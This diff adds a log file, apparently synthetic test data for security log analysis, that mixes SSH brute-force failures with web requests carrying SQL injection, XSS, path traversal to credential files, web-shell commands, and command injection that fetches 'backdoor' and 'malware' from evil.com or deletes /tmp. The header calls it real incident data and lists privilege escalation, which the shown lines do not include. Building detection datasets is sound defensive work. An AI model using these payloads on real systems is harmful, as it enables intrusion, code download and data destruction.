@@ -1,0 +1,841 @@
+# ============================================================
+# 真实安全事件数据集
+# 生成时间: 2024-12-15
+# 包含: SSH暴力破解、SQL注入、XSS、路径遍历、WebShell、命令注入、权限提升
+# ============================================================
+2024-12-15T15:30:00.000000+0800 192.168.1.100 - - "GET /api/users HTTP/1.1" 200 413
+Dec 15 14:20:18 server1 sshd[12345]: Failed password for invalid user mysql from 91.121.87.18 port 28049 ssh2
+Dec 15 14:19:30 server1 sshd[12345]: Failed password for invalid user ftpuser from 45.154.255.147 port 31341 ssh2
+Dec 15 14:19:15 server1 sshd[12345]: Failed password for invalid user guest from 185.220.101.46 port 50511 ssh2
+2024-12-15T15:06:50.000000+0800 103.35.74.12 - - "POST /products.php?id=' OR 1=1-- HTTP/1.1" 500 4186
+2024-12-15T08:15:00.000000+0800 10.0.0.50 - - "GET /api/users HTTP/1.1" 200 871
+Dec 15 14:16:51 server1 sshd[12345]: Failed password for invalid user guest from 10.0.0.100 port 30422 ssh2
+2024-12-15T15:06:20.000000+0800 185.220.101.46 - - "POST /products.php?id=-1 UNION ALL SELECT @@version,user(),database()-- HTTP/1.1" 200 530
+Dec 15 14:00:09 server1 sshd[12345]: Failed password for invalid user ftpuser from 91.121.87.18 port 39342 ssh2
+Dec 15 15:40:00 server1 systemd[1]: Started Session 92 of user deploy.
+Dec 15 14:04:36 server1 sshd[12345]: Failed password for invalid user www-data from 192.168.100.50 port 51262 ssh2
+Dec 15 14:17:21 server1 sshd[12345]: Failed password for invalid user ubuntu from 192.168.100.50 port 31532 ssh2
+2024-12-15T15:20:00.000000+0800 192.168.1.101 - - "POST /api/login HTTP/1.1" 200 179
+2024-12-15T17:03:00.000000+0800 91.121.87.18 - - "GET /files/..\..\windows\system32\config\sam HTTP/1.1" 404 1204
+2024-12-15T15:15:00.000000+0800 192.168.1.100 - - "GET /api/users HTTP/1.1" 200 555
+Dec 15 14:01:54 server1 sshd[12345]: Failed password for invalid user test from 10.0.0.100 port 35362 ssh2
+Dec 15 14:08:21 server1 sshd[12345]: Failed password for invalid user mysql from 192.168.100.50 port 46852 ssh2
+Dec 15 14:14:30 server1 sshd[12345]: Failed password for invalid user deploy from 103.35.74.12 port 24146 ssh2
+2024-12-15T19:50:00.000000+0800 10.0.0.50 - - "POST /api/login HTTP/1.1" 200 86
+Dec 15 14:18:42 server1 sshd[12345]: Failed password for invalid user ubuntu from 185.220.101.46 port 23125 ssh2
+Dec 15 14:06:57 server1 sshd[12345]: Connection closed by 91.121.87.18 port 22 [preauth]
+Dec 15 14:17:54 server1 sshd[12345]: Failed password for invalid user test from 10.0.0.100 port 21598 ssh2
+Dec 15 14:09:24 server1 sshd[12345]: Failed password for invalid user guest from 103.35.74.12 port 30614 ssh2
+2024-12-15T09:05:00.000000+0800 10.0.0.50 - - "POST /api/login HTTP/1.1" 200 100
+Dec 15 14:01:57 server1 sshd[12345]: Connection closed by 45.154.255.147 port 22 [preauth]
+Dec 15 14:19:18 server1 sshd[12345]: Failed password for invalid user guest from 45.154.255.147 port 58862 ssh2
+Dec 15 14:12:09 server1 sshd[12345]: Failed password for invalid user test from 192.168.100.50 port 46326 ssh2
+2024-12-15T16:03:00.000000+0800 91.121.87.18 - - "GET /search.php?q=%3Ciframe src='javascript:alert(1)'%3E%3C/iframe%3E HTTP/1.1" 200 270
+Dec 15 12:25:00 server1 systemd[1]: Started Session 53 of user deploy.
+Dec 15 14:06:36 server1 sshd[12345]: Failed password for invalid user ftpuser from 91.121.87.18 port 56288 ssh2
+Dec 15 14:07:03 server1 sshd[12345]: Failed password for invalid user ftpuser from 45.154.255.147 port 35261 ssh2
+Dec 15 14:24:18 server1 sshd[12345]: Failed password for invalid user www-data from 10.0.0.100 port 37817 ssh2
+Dec 15 14:10:03 server1 sshd[12345]: Failed password for invalid user ubuntu from 103.35.74.12 port 35793 ssh2
+2024-12-15T12:15:00.000000+0800 10.0.0.50 - - "GET /api/users HTTP/1.1" 200 304
+2024-12-15T19:01:20.000000+0800 103.35.74.12 - - "GET /ping.php?host=8.8.8.8;curl -O http://evil.com/backdoor HTTP/1.1" 200 3137
+2024-12-15T08:30:00.000000+0800 10.0.0.50 - - "GET /api/users HTTP/1.1" 200 535
+2024-12-15T15:07:20.000000+0800 185.220.101.46 - - "POST /products.php?id=1 OR 1=1 HTTP/1.1" 500 4311
+2024-12-15T16:02:00.000000+0800 91.121.87.18 - - "GET /search.php?q=%3Cscript%3Ealert('XSS')%3C/script%3E HTTP/1.1" 200 533
+Dec 15 14:09:00 server1 sshd[12345]: Failed password for invalid user guest from 103.35.74.12 port 49376 ssh2
+2024-12-15T19:05:00.000000+0800 192.168.1.100 - - "POST /api/login HTTP/1.1" 200 162
+Dec 15 14:22:54 server1 sshd[12345]: Failed password for invalid user administrator from 91.121.87.18 port 22435 ssh2
+Dec 15 14:24:21 server1 sshd[12345]: Failed password for invalid user ubuntu from 103.35.74.12 port 57936 ssh2
+2024-12-15T15:03:10.000000+0800 192.168.100.50 - - "POST /products.php?id=1' ORDER BY 10-- HTTP/1.1" 500 4377
+Dec 15 14:22:12 server1 sshd[12345]: Failed password for invalid user git from 192.168.100.50 port 48136 ssh2
+Dec 15 14:12:33 server1 sshd[12345]: Failed password for invalid user git from 192.168.100.50 port 59404 ssh2
+2024-12-15T20:30:00.000000+0800 10.0.0.50 - - "GET /api/users HTTP/1.1" 200 270
+2024-12-15T15:00:20.000000+0800 45.154.255.147 - - "POST /products.php?id=UNION SELECT username,password FROM users-- HTTP/1.1" 500 3452
+Dec 15 14:01:15 server1 sshd[12345]: Failed password for invalid user test from 192.168.100.50 port 59790 ssh2
+2024-12-15T19:01:00.000000+0800 103.35.74.12 - - "GET /ping.php?host=8.8.8.8&& wget http://evil.com/malware HTTP/1.1" 200 1552
+Dec 15 14:05:45 server1 sshd[12345]: Failed password for invalid user guest from 91.121.87.18 port 56311 ssh2
+2024-12-15T17:15:00.000000+0800 192.168.1.101 - - "GET /api/users HTTP/1.1" 200 237
+Dec 15 14:08:12 server1 sshd[12345]: Failed password for invalid user oracle from 103.35.74.12 port 47881 ssh2
+2024-12-16T00:05:00.000000+0800 10.0.0.50 - - "POST /api/login HTTP/1.1" 200 124
+Dec 15 14:20:36 server1 sshd[12345]: Failed password for invalid user administrator from 10.0.0.100 port 15770 ssh2
+2024-12-15T18:05:30.000000+0800 185.220.101.46 - - "GET /uploads/shell.php?cmd=pwd HTTP/1.1" 200 438
+2024-12-15T16:02:30.000000+0800 91.121.87.18 - - "GET /search.php?q=%3Csvg onload=alert(1)%3E HTTP/1.1" 200 773
+2024-12-15T21:00:00.000000+0800 10.0.0.50 - - "GET /api/users HTTP/1.1" 200 687
+2024-12-15T18:09:30.000000+0800 103.35.74.12 - - "GET /uploads/shell.php?cmd=uname -a HTTP/1.1" 200 288
+2024-12-15T11:05:00.000000+0800 192.168.1.100 - - "POST /api/login HTTP/1.1" 200 174
+Dec 15 12:40:00 server1 systemd[1]: Started Session 56 of user deploy.
+Dec 15 14:01:39 server1 sshd[12345]: Failed password for invalid user test from 10.0.0.100 port 26336 ssh2
+2024-12-15T19:00:40.000000+0800 45.154.255.147 - - "GET /ping.php?host=8.8.8.8`whoami` HTTP/1.1" 200 748
+Dec 15 14:04:45 server1 sshd[12345]: Failed password for invalid user mysql from 185.220.101.46 port 39683 ssh2
+Dec 15 14:18:48 server1 sshd[12345]: Failed password for invalid user guest from 103.35.74.12 port 51248 ssh2
+2024-12-15T14:00:00.000000+0800 192.168.1.101 - - "GET /api/users HTTP/1.1" 200 821
+2024-12-15T16:00:45.000000+0800 103.35.74.12 - - "GET /search.php?q=javascript:alert(document.cookie) HTTP/1.1" 200 780
+2024-12-15T09:30:00.000000+0800 10.0.0.50 - - "GET /api/users HTTP/1.1" 200 340
+2024-12-15T17:50:00.000000+0800 192.168.1.101 - - "POST /api/login HTTP/1.1" 200 51
+Dec 15 14:21:36 server1 sshd[12345]: Failed password for invalid user root from 185.220.101.46 port 47683 ssh2
+2024-12-15T15:02:10.000000+0800 103.35.74.12 - - "GET /products.php?id='; DROP TABLE users-- HTTP/1.1" 403 2214
+2024-12-15T21:05:00.000000+0800 192.168.1.100 - - "POST /api/login HTTP/1.1" 200 75
+Dec 15 14:12:36 server1 sshd[12345]: Failed password for invalid user ftpuser from 192.168.100.50 port 49415 ssh2
+Dec 15 14:16:27 server1 sshd[12345]: Connection closed by 185.220.101.46 port 22 [preauth]
+Dec 15 14:20:33 server1 sshd[12345]: Failed password for invalid user guest from 185.220.101.46 port 56742 ssh2
+Dec 15 14:14:39 server1 sshd[12345]: Failed password for invalid user test from 185.220.101.46 port 58712 ssh2
+Dec 15 14:20:15 server1 sshd[12345]: Failed password for invalid user deploy from 10.0.0.100 port 55643 ssh2
+Dec 15 14:16:30 server1 sshd[12345]: Failed password for invalid user ubuntu from 103.35.74.12 port 51525 ssh2
+Dec 15 14:18:06 server1 sshd[12345]: Failed password for invalid user www-data from 103.35.74.12 port 21200 ssh2
+2024-12-15T16:01:45.000000+0800 185.220.101.46 - - "GET /search.php?q=%3Csvg%3E%3Cx%3E%3Canimate onbegin=alert(1) attributeName=x%3E%3C/svg%3E HTTP/1.1" 200 188
+2024-12-15T21:35:00.000000+0800 10.0.0.50 - - "POST /api/login HTTP/1.1" 200 135
+Dec 15 14:02:45 server1 sshd[12345]: Failed password for invalid user deploy from 10.0.0.100 port 42556 ssh2
+2024-12-15T13:15:00.000000+0800 10.0.0.50 - - "GET /api/users HTTP/1.1" 200 560
+Dec 15 14:11:36 server1 sshd[12345]: Failed password for invalid user deploy from 10.0.0.100 port 14221 ssh2
+Dec 15 14:04:03 server1 sshd[12345]: Failed password for invalid user root from 103.35.74.12 port 15371 ssh2
+Dec 15 14:13:39 server1 sshd[12345]: Failed password for invalid user mysql from 185.220.101.46 port 52941 ssh2
+2024-12-15T16:01:30.000000+0800 185.220.101.46 - - "GET /search.php?q=%3Cinput onfocus=alert(1) autofocus%3E HTTP/1.1" 200 684
+2024-12-15T16:15:00.000000+0800 192.168.1.100 - - "GET /api/users HTTP/1.1" 200 570
+Dec 15 14:07:39 server1 sshd[12345]: Failed password for invalid user admin from 103.35.74.12 port 37188 ssh2
+2024-12-15T18:02:00.000000+0800 192.168.100.50 - - "GET /uploads/shell.php?cmd=whoami HTTP/1.1" 200 211
+Dec 15 14:22:09 server1 sshd[12345]: Failed password for invalid user oracle from 45.154.255.147 port 59632 ssh2
+2024-12-15T15:05:30.000000+0800 10.0.0.100 - - "POST /products.php?id='; DROP TABLE users-- HTTP/1.1" 500 2921
+2024-12-15T15:05:50.000000+0800 185.220.101.46 - - "POST /products.php?id=admin'-- HTTP/1.1" 403 998
+Dec 15 14:21:39 server1 sshd[12345]: Failed password for invalid user git from 103.35.74.12 port 53861 ssh2
+2024-12-15T16:04:45.000000+0800 91.121.87.18 - - "GET /search.php?q=javascript:alert(document.cookie) HTTP/1.1" 200 132
+Dec 15 14:10:48 server1 sshd[12345]: Failed password for invalid user deploy from 91.121.87.18 port 39467 ssh2
+Dec 15 14:10:00 server1 sshd[12345]: Failed password for invalid user administrator from 45.154.255.147 port 53150 ssh2
+Dec 15 14:07:48 server1 sshd[12345]: Failed password for invalid user ftpuser from 45.154.255.147 port 53366 ssh2
+Dec 15 14:55:00 server1 systemd[1]: Started Session 83 of user deploy.
+Dec 15 14:05:03 server1 sshd[12345]: Failed password for invalid user deploy from 192.168.100.50 port 26907 ssh2
+Dec 15 14:11:42 server1 sshd[12345]: Failed password for invalid user ftpuser from 91.121.87.18 port 54706 ssh2
+2024-12-15T17:00:48.000000+0800 185.220.101.46 - - "GET /files/....//....//etc/passwd HTTP/1.1" 200 1742
+2024-12-15T11:35:00.000000+0800 192.168.1.101 - - "POST /api/login HTTP/1.1" 200 122
+Dec 15 14:02:09 server1 sshd[12345]: Failed password for invalid user administrator from 185.220.101.46 port 15268 ssh2
+2024-12-15T22:05:00.000000+0800 192.168.1.100 - - "POST /api/login HTTP/1.1" 200 62
+Dec 15 14:07:21 server1 sshd[12345]: Failed password for invalid user www-data from 10.0.0.100 port 38076 ssh2
+Dec 15 14:09:06 server1 sshd[12345]: Failed password for invalid user postgres from 192.168.100.50 port 15266 ssh2
+2024-12-15T18:06:00.000000+0800 10.0.0.100 - - "GET /uploads/shell.php?cmd=ls -la HTTP/1.1" 200 349
+Dec 15 14:00:21 server1 sshd[12345]: Failed password for invalid user administrator from 10.0.0.100 port 41510 ssh2
+2024-12-15T17:35:00.000000+0800 192.168.1.100 - - "POST /api/login HTTP/1.1" 200 160
+Dec 15 14:22:18 server1 sshd[12345]: Failed password for invalid user ubuntu from 103.35.74.12 port 39739 ssh2
+Dec 15 08:55:00 server1 systemd[1]: Started Session 11 of user deploy.
+2024-12-15T15:01:20.000000+0800 45.154.255.147 - - "POST /products.php?id=-1 UNION ALL SELECT @@version,user(),database()-- HTTP/1.1" 403 4900
+Dec 15 14:02:36 server1 sshd[12345]: Failed password for invalid user oracle from 185.220.101.46 port 50652 ssh2
+2024-12-15T15:02:50.000000+0800 103.35.74.12 - - "GET /products.php?id=1; EXEC xp_cmdshell('whoami')-- HTTP/1.1" 403 4174
+Dec 15 14:03:03 server1 sshd[12345]: Failed password for invalid user www-data from 192.168.100.50 port 57083 ssh2
+2024-12-15T19:02:00.000000+0800 91.121.87.18 - - "GET /ping.php?host=8.8.8.8;rm -rf /tmp/* HTTP/1.1" 200 1052
+Dec 15 14:07:54 server1 sshd[12345]: Failed password for invalid user postgres from 185.220.101.46 port 35815 ssh2
+Dec 15 14:08:42 server1 sshd[12345]: Failed password for invalid user mysql from 185.220.101.46 port 53018 ssh2
+Dec 15 14:14:00 server1 sshd[12345]: Failed password for invalid user oracle from 192.168.100.50 port 54487 ssh2
+2024-12-15T19:03:20.000000+0800 192.168.100.50 - - "GET /ping.php?host=8.8.8.8&& wget http://evil.com/malware HTTP/1.1" 200 3733
+Dec 15 17:40:00 server1 systemd[1]: Started Session 116 of user deploy.
+Dec 15 14:04:42 server1 sshd[12345]: Failed password for invalid user ftpuser from 192.168.100.50 port 51790 ssh2
+Dec 15 18:25:00 server1 systemd[1]: Started Session 125 of user deploy.
+Dec 15 14:05:06 server1 sshd[12345]: Failed password for invalid user guest from 10.0.0.100 port 53700 ssh2
+2024-12-15T10:15:00.000000+0800 192.168.1.100 - - "GET /api/users HTTP/1.1" 200 549
+Dec 15 10:25:00 server1 systemd[1]: Started Session 29 of user deploy.
+Dec 15 14:12:00 server1 sshd[12345]: Failed password for invalid user ubuntu from 103.35.74.12 port 59215 ssh2
+2024-12-15T08:00:00.000000+0800 10.0.0.50 - - "GET /api/users HTTP/1.1" 200 673
+2024-12-15T15:01:10.000000+0800 45.154.255.147 - - "POST /products.php?id=1; EXEC xp_cmdshell('whoami')-- HTTP/1.1" 200 2057
+2024-12-15T23:45:00.000000+0800 192.168.1.100 - - "GET /api/users HTTP/1.1" 200 654
+2024-12-15T19:30:00.000000+0800 10.0.0.50 - - "GET /api/users HTTP/1.1" 200 541
+Dec 15 14:20:12 server1 sshd[12345]: Failed password for invalid user admin from 103.35.74.12 port 13447 ssh2
+2024-12-15T18:00:00.000000+0800 192.168.1.100 - - "GET /api/users HTTP/1.1" 200 435
+2024-12-15T12:20:00.000000+0800 10.0.0.50 - - "POST /api/login HTTP/1.1" 200 124
+2024-12-15T22:45:00.000000+0800 192.168.1.100 - - "GET /api/users HTTP/1.1" 200 465
+Dec 15 14:20:00 server1 sshd[12345]: Failed password for invalid user administrator from 103.35.74.12 port 52592 ssh2
+Dec 15 14:22:36 server1 sshd[12345]: Failed password for invalid user git from 10.0.0.100 port 58649 ssh2
+Dec 15 14:15:39 server1 sshd[12345]: Failed password for invalid user root from 10.0.0.100 port 21204 ssh2
+Dec 15 14:06:54 server1 sshd[12345]: Failed password for invalid user postgres from 185.220.101.46 port 10218 ssh2
+Dec 15 14:22:24 server1 sshd[12345]: Failed password for invalid user deploy from 185.220.101.46 port 28143 ssh2
+Dec 15 14:06:33 server1 sshd[12345]: Failed password for invalid user oracle from 103.35.74.12 port 33349 ssh2
+Dec 15 14:13:54 server1 sshd[12345]: Failed password for invalid user postgres from 91.121.87.18 port 38294 ssh2
+Dec 15 14:15:45 server1 sshd[12345]: Failed password for invalid user postgres from 91.121.87.18 port 35846 ssh2
+Dec 15 14:09:21 server1 sshd[12345]: Failed password for invalid user ubuntu from 91.121.87.18 port 15525 ssh2
+Dec 15 14:15:09 server1 sshd[12345]: Failed password for invalid user administrator from 185.220.101.46 port 56671 ssh2
+Dec 15 14:08:54 server1 sshd[12345]: Failed password for invalid user ubuntu from 185.220.101.46 port 54775 ssh2
+2024-12-15T14:30:00.000000+0800 192.168.1.100 - - "GET /api/users HTTP/1.1" 200 110
+2024-12-15T15:06:40.000000+0800 192.168.100.50 - - "POST /products.php?id=' OR '1'='1 HTTP/1.1" 200 304
+2024-12-16T00:30:00.000000+0800 192.168.1.100 - - "GET /api/users HTTP/1.1" 200 844
+Dec 15 14:06:21 server1 sshd[12345]: Failed password for invalid user git from 45.154.255.147 port 28635 ssh2
+Dec 15 14:23:54 server1 sshd[12345]: Failed password for invalid user mysql from 45.154.255.147 port 14084 ssh2
+Dec 15 14:13:03 server1 sshd[12345]: Failed password for invalid user oracle from 45.154.255.147 port 14504 ssh2
+Dec 15 14:01:30 server1 sshd[12345]: Failed password for invalid user root from 45.154.255.147 port 38142 ssh2
+Dec 15 14:08:06 server1 sshd[12345]: Failed password for invalid user deploy from 91.121.87.18 port 35678 ssh2
+Dec 15 23:55:00 server1 systemd[1]: Started Session 191 of user deploy.
+2024-12-15T08:45:00.000000+0800 192.168.1.101 - - "GET /api/users HTTP/1.1" 200 740
+2024-12-15T18:07:00.000000+0800 192.168.100.50 - - "GET /uploads/shell.php?cmd=pwd HTTP/1.1" 200 285
+Dec 15 14:10:42 server1 sshd[12345]: Failed password for invalid user deploy from 185.220.101.46 port 17923 ssh2
+2024-12-15T15:03:40.000000+0800 192.168.100.50 - - "GET /products.php?id=UNION SELECT username,password FROM users-- HTTP/1.1" 403 4763
+Dec 15 14:06:51 server1 sshd[12345]: Failed password for invalid user git from 185.220.101.46 port 17290 ssh2
+Dec 15 19:55:00 server1 systemd[1]: Started Session 143 of user deploy.
+Dec 15 13:25:00 server1 systemd[1]: Started Session 65 of user deploy.
+Dec 15 14:22:27 server1 sshd[12345]: Connection closed by 192.168.100.50 port 22 [preauth]
+Dec 15 14:14:36 server1 sshd[12345]: Failed password for invalid user oracle from 192.168.100.50 port 13777 ssh2
+Dec 15 14:13:21 server1 sshd[12345]: Failed password for invalid user guest from 10.0.0.100 port 41505 ssh2
+Dec 15 14:00:03 server1 sshd[12345]: Failed password for invalid user deploy from 185.220.101.46 port 11801 ssh2
+Dec 15 14:24:57 server1 sshd[12345]: Connection closed by 91.121.87.18 port 22 [preauth]
+Dec 15 14:12:57 server1 sshd[12345]: Connection closed by 103.35.74.12 port 22 [preauth]
+Dec 15 14:17:12 server1 sshd[12345]: Failed password for invalid user administrator from 45.154.255.147 port 54288 ssh2
+Dec 15 14:24:36 server1 sshd[12345]: Failed password for invalid user oracle from 91.121.87.18 port 41692 ssh2
+2024-12-15T15:01:00.000000+0800 185.220.101.46 - - "POST /products.php?id=' OR ''=' HTTP/1.1" 403 3300
+Dec 15 14:23:39 server1 sshd[12345]: Failed password for invalid user git from 45.154.255.147 port 26267 ssh2
+2024-12-15T14:35:00.000000+0800 192.168.1.101 - - "POST /api/login HTTP/1.1" 200 76
+Dec 15 14:08:45 server1 sshd[12345]: Failed password for invalid user oracle from 192.168.100.50 port 19877 ssh2
+Dec 15 22:55:00 server1 systemd[1]: Started Session 179 of user deploy.
+Dec 15 14:17:42 server1 sshd[12345]: Failed password for invalid user root from 10.0.0.100 port 19511 ssh2
+Dec 15 14:15:21 server1 sshd[12345]: Failed password for invalid user mysql from 103.35.74.12 port 39182 ssh2
+2024-12-15T17:02:12.000000+0800 91.121.87.18 - - "GET /files/....//....//etc/passwd HTTP/1.1" 403 714
+2024-12-15T21:15:00.000000+0800 192.168.1.101 - - "GET /api/users HTTP/1.1" 200 993
+Dec 15 14:03:30 server1 sshd[12345]: Failed password for invalid user ftpuser from 10.0.0.100 port 23067 ssh2
+Dec 15 14:19:03 server1 sshd[12345]: Failed password for invalid user admin from 185.220.101.46 port 20029 ssh2
+Dec 15 14:06:48 server1 sshd[12345]: Failed password for invalid user deploy from 45.154.255.147 port 30795 ssh2
+2024-12-15T12:00:00.000000+0800 192.168.1.100 - - "GET /api/users HTTP/1.1" 200 332
+Dec 15 16:40:00 server1 systemd[1]: Started Session 104 of user deploy.
+Dec 15 14:02:06 server1 sshd[12345]: Failed password for invalid user www-data from 45.154.255.147 port 28537 ssh2
+2024-12-15T12:05:00.000000+0800 192.168.1.101 - - "POST /api/login HTTP/1.1" 200 94
+2024-12-15T16:03:30.000000+0800 10.0.0.100 - - "GET /search.php?q=%3Cinput onfocus=alert(1) autofocus%3E HTTP/1.1" 200 712
+Dec 15 14:14:21 server1 sshd[12345]: Failed password for invalid user deploy from 91.121.87.18 port 46322 ssh2
+Dec 15 14:17:45 server1 sshd[12345]: Failed password for invalid user ftpuser from 91.121.87.18 port 50777 ssh2
+Dec 15 18:40:00 server1 systemd[1]: Started Session 128 of user deploy.
+Dec 15 14:18:00 server1 sshd[12345]: Failed password for invalid user git from 103.35.74.12 port 18564 ssh2
+Dec 15 14:17:06 server1 sshd[12345]: Failed password for invalid user mysql from 185.220.101.46 port 57949 ssh2
+Dec 15 14:06:06 server1 sshd[12345]: Failed password for invalid user root from 10.0.0.100 port 26185 ssh2
+Dec 15 14:10:54 server1 sshd[12345]: Failed password for invalid user guest from 192.168.100.50 port 13459 ssh2
+2024-12-15T11:30:00.000000+0800 192.168.1.101 - - "GET /api/users HTTP/1.1" 200 962
+Dec 15 14:11:30 server1 sshd[12345]: Failed password for invalid user test from 185.220.101.46 port 23433 ssh2
+Dec 15 14:13:45 server1 sshd[12345]: Failed password for invalid user ftpuser from 10.0.0.100 port 45508 ssh2
+Dec 15 14:14:15 server1 sshd[12345]: Failed password for invalid user postgres from 192.168.100.50 port 21953 ssh2
+Dec 15 14:23:18 server1 sshd[12345]: Failed password for invalid user ftpuser from 103.35.74.12 port 41406 ssh2
+Dec 15 14:15:06 server1 sshd[12345]: Failed password for invalid user administrator from 192.168.100.50 port 58939 ssh2
+2024-12-15T17:03:36.000000+0800 103.35.74.12 - - "GET /files/....//....//etc/passwd HTTP/1.1" 403 2331
+2024-12-15T11:20:00.000000+0800 192.168.1.101 - - "POST /api/login HTTP/1.1" 200 136
+Dec 15 14:14:24 server1 sshd[12345]: Failed password for invalid user ubuntu from 10.0.0.100 port 49356 ssh2
+Dec 15 14:00:54 server1 sshd[12345]: Failed password for invalid user git from 10.0.0.100 port 41803 ssh2
+2024-12-15T22:00:00.000000+0800 192.168.1.100 - - "GET /api/users HTTP/1.1" 200 675
+2024-12-15T15:03:00.000000+0800 185.220.101.46 - - "GET /products.php?id=-1 UNION ALL SELECT @@version,user(),database()-- HTTP/1.1" 200 1866
+Dec 15 14:10:39 server1 sshd[12345]: Failed password for invalid user admin from 185.220.101.46 port 54291 ssh2
+Dec 15 14:00:57 server1 sshd[12345]: Connection closed by 10.0.0.100 port 22 [preauth]
+Dec 15 14:21:09 server1 sshd[12345]: Failed password for invalid user test from 91.121.87.18 port 13342 ssh2
+Dec 15 14:03:51 server1 sshd[12345]: Failed password for invalid user git from 103.35.74.12 port 40583 ssh2
+2024-12-15T22:50:00.000000+0800 192.168.1.100 - - "POST /api/login HTTP/1.1" 200 71
+2024-12-15T19:04:20.000000+0800 45.154.255.147 - - "GET /ping.php?host=8.8.8.8;rm -rf /tmp/* HTTP/1.1" 200 2486
+Dec 15 14:13:36 server1 sshd[12345]: Failed password for invalid user admin from 185.220.101.46 port 33449 ssh2
+2024-12-15T17:02:00.000000+0800 91.121.87.18 - - "GET /files/..%2f..%2fetc%2fshadow HTTP/1.1" 200 2782
+Dec 15 14:16:54 server1 sshd[12345]: Failed password for invalid user guest from 103.35.74.12 port 35811 ssh2
+Dec 15 14:08:39 server1 sshd[12345]: Failed password for invalid user git from 103.35.74.12 port 55733 ssh2
+Dec 15 14:16:24 server1 sshd[12345]: Failed password for invalid user root from 10.0.0.100 port 38241 ssh2
+Dec 15 14:17:36 server1 sshd[12345]: Failed password for invalid user root from 185.220.101.46 port 25936 ssh2
+Dec 15 14:04:06 server1 sshd[12345]: Failed password for invalid user admin from 192.168.100.50 port 13975 ssh2
+Dec 15 14:14:54 server1 sshd[12345]: Failed password for invalid user ftpuser from 192.168.100.50 port 45717 ssh2
+Dec 15 14:19:21 server1 sshd[12345]: Failed password for invalid user administrator from 192.168.100.50 port 17976 ssh2
+2024-12-15T15:05:00.000000+0800 10.0.0.50 - - "POST /api/login HTTP/1.1" 200 198
+Dec 15 14:13:09 server1 sshd[12345]: Failed password for invalid user git from 192.168.100.50 port 31187 ssh2
+Dec 15 14:17:57 server1 sshd[12345]: Connection closed by 192.168.100.50 port 22 [preauth]
+Dec 15 14:04:00 server1 sshd[12345]: Failed password for invalid user ftpuser from 10.0.0.100 port 44950 ssh2
+2024-12-16T00:35:00.000000+0800 10.0.0.50 - - "POST /api/login HTTP/1.1" 200 57
+2024-12-15T22:35:00.000000+0800 10.0.0.50 - - "POST /api/login HTTP/1.1" 200 102
+Dec 15 14:18:09 server1 sshd[12345]: Failed password for invalid user git from 103.35.74.12 port 59360 ssh2
+Dec 15 14:11:09 server1 sshd[12345]: Failed password for invalid user guest from 192.168.100.50 port 58881 ssh2
+Dec 15 14:12:06 server1 sshd[12345]: Failed password for invalid user ubuntu from 185.220.101.46 port 35534 ssh2
+2024-12-15T17:02:48.000000+0800 185.220.101.46 - - "GET /files/../../etc/passwd HTTP/1.1" 404 1014
+Dec 15 14:02:30 server1 sshd[12345]: Failed password for invalid user git from 10.0.0.100 port 18868 ssh2
+Dec 15 14:01:03 server1 sshd[12345]: Failed password for invalid user administrator from 192.168.100.50 port 44589 ssh2
+Dec 15 14:11:15 server1 sshd[12345]: Failed password for invalid user deploy from 45.154.255.147 port 27944 ssh2
+Dec 15 14:01:06 server1 sshd[12345]: Failed password for invalid user administrator from 103.35.74.12 port 43874 ssh2
+Dec 15 14:22:15 server1 sshd[12345]: Failed password for invalid user git from 192.168.100.50 port 14688 ssh2
+Dec 15 18:55:00 server1 systemd[1]: Started Session 131 of user deploy.
+2024-12-15T18:05:00.000000+0800 91.121.87.18 - - "GET /uploads/shell.php?cmd=whoami HTTP/1.1" 200 193
+Dec 15 14:06:00 server1 sshd[12345]: Failed password for invalid user www-data from 10.0.0.100 port 21056 ssh2
+Dec 15 14:24:06 server1 sshd[12345]: Failed password for invalid user admin from 185.220.101.46 port 20659 ssh2
+Dec 16 00:10:00 server1 systemd[1]: Started Session 194 of user deploy.
+2024-12-15T15:45:00.000000+0800 192.168.1.101 - - "GET /api/users HTTP/1.1" 200 497
+Dec 15 14:19:06 server1 sshd[12345]: Failed password for invalid user git from 185.220.101.46 port 54214 ssh2
+2024-12-15T19:35:00.000000+0800 10.0.0.50 - - "POST /api/login HTTP/1.1" 200 122
+Dec 15 14:21:42 server1 sshd[12345]: Failed password for invalid user administrator from 91.121.87.18 port 34865 ssh2
+2024-12-15T18:01:30.000000+0800 10.0.0.100 - - "GET /uploads/shell.php?cmd=id HTTP/1.1" 200 66
+Dec 15 14:00:36 server1 sshd[12345]: Failed password for invalid user admin from 185.220.101.46 port 25254 ssh2
+Dec 15 14:03:33 server1 sshd[12345]: Failed password for invalid user test from 91.121.87.18 port 29814 ssh2
+Dec 15 14:00:33 server1 sshd[12345]: Failed password for invalid user deploy from 185.220.101.46 port 19652 ssh2
+Dec 15 14:09:39 server1 sshd[12345]: Failed password for invalid user www-data from 45.154.255.147 port 28353 ssh2
+Dec 15 14:11:27 server1 sshd[12345]: Connection closed by 192.168.100.50 port 22 [preauth]
+Dec 15 16:25:00 server1 systemd[1]: Started Session 101 of user deploy.
+Dec 15 14:23:48 server1 sshd[12345]: Failed password for invalid user git from 91.121.87.18 port 53097 ssh2
+Dec 15 14:15:27 server1 sshd[12345]: Connection closed by 103.35.74.12 port 22 [preauth]
+Dec 15 14:09:30 server1 sshd[12345]: Failed password for invalid user ftpuser from 45.154.255.147 port 55803 ssh2
+2024-12-15T17:05:00.000000+0800 192.168.1.100 - - "POST /api/login HTTP/1.1" 200 108
+Dec 15 14:09:36 server1 sshd[12345]: Failed password for invalid user mysql from 192.168.100.50 port 27706 ssh2
+2024-12-15T17:01:24.000000+0800 45.154.255.147 - - "GET /files/../../etc/passwd HTTP/1.1" 403 743
+Dec 15 13:40:00 server1 systemd[1]: Started Session 68 of user deploy.
+Dec 15 14:06:42 server1 sshd[12345]: Failed password for invalid user guest from 91.121.87.18 port 59146 ssh2
+Dec 15 14:02:15 server1 sshd[12345]: Failed password for invalid user deploy from 10.0.0.100 port 47957 ssh2
+Dec 15 14:02:54 server1 sshd[12345]: Failed password for invalid user test from 103.35.74.12 port 32785 ssh2
+Dec 15 14:06:15 server1 sshd[12345]: Failed password for invalid user admin from 45.154.255.147 port 41174 ssh2
+Dec 15 14:23:30 server1 sshd[12345]: Failed password for invalid user git from 185.220.101.46 port 39437 ssh2
+Dec 15 14:13:51 server1 sshd[12345]: Failed password for invalid user guest from 185.220.101.46 port 11494 ssh2
+2024-12-15T15:04:40.000000+0800 10.0.0.100 - - "POST /products.php?id=-1 UNION ALL SELECT @@version,user(),database()-- HTTP/1.1" 500 297
+Dec 15 14:20:42 server1 sshd[12345]: Failed password for invalid user ftpuser from 91.121.87.18 port 24472 ssh2
